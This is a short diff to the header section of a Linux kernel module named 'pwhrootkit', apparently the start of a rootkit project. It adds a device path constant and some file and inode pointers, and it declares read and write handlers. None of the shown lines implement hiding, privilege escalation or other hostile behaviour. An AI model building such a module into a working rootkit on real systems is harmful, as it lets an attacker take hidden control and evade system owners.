@@ -5,12 +5,15 @@
 #include <linux/device.h>
 
 #define DEVICE_NAME "pwhrootkit"
+#define DEVICE_PATH "/dev/pwhrootkit"
 #define CLASS_NAME "pwhrootkit"
 
 static int major_num;
 static int erro_code;
-static struct class *module_class;
-static struct device *module_device;
+static struct class *module_class = NULL;
+static struct device *module_device = NULL;
+static struct file * __file = NULL;
+static struct inode * __inode = NULL;
 
 static ssize_t pwh_rootkit_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t pwh_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
